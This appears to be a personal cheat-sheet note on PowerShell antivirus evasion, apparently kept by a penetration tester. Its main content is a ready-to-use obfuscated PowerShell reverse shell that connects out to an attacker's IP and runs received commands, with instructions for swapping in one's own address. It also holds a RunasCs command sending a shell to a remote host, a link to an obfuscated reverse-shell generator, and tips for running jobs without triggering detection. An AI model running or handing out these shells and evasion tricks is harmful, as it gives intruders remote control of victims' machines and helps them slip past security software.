---
creation date: April 6th 2023
last modified date: April 6th 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Powershell AV bypasses]]  
___

## Description:  

**Run a process as a different user (with creds)**
[RunasCs](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)
```
Invoke-RunasCs -Username snovvcrash -Password 'Passw0rd!' -Domain megacorp.local -Command powershell.exe -Remote 10.10.13.37:1337
```


**ASMI bypass**
```
while ($true) {$px = "c0","a8","38","1";$p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.';$w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n";$s = [System.Text.ASCIIEncoding];[byte[]]$b = 0..65535|%{0};$x = "n-eiorvsxpk5";Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);$y = New-Object System.Net.Sockets.TCPClient($p,80);$z = $y.GetStream();$d = $s::UTF8.GetBytes($w);$z.Write($d, 0, $d.Length);$t = (n-eiorvsxpk5 whoami) + "$ ";while(($l = $z.Read($b, 0, $b.Length)) -ne 0){;$v = (New-Object -TypeName $s).GetString($b,0, $l);$d = $s::UTF8.GetBytes((n-eiorvsxpk5 $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t);$z.Write($d, 0, $d.Length);}$y.Close();Start-Sleep -Seconds 5}
```
You have to change your IP address to hex (`$px = "c0","a8","38","1"`add 0 in front if needed) and change your port number (`($p,80)`)

**Obfuscated PowerShell Reverse Shells**
[gh0x0st](https://github.com/gh0x0st/Get-ReverseShell)

**Run a new PowerShell command in background**
```
start-job -scriptblock { C:\TeamCity\buildAgent\work\74c2f03019966b3e\hello_world.ps1 }

Start-Process powershell.exe -ArgumentList "-file C:\TeamCity\buildAgent\work\74c2f03019966b3e\hello_world.ps1"

```
Can sometimes avoid detection by not having your process run a new job as a child



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: April 6th 2023 (09:32 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
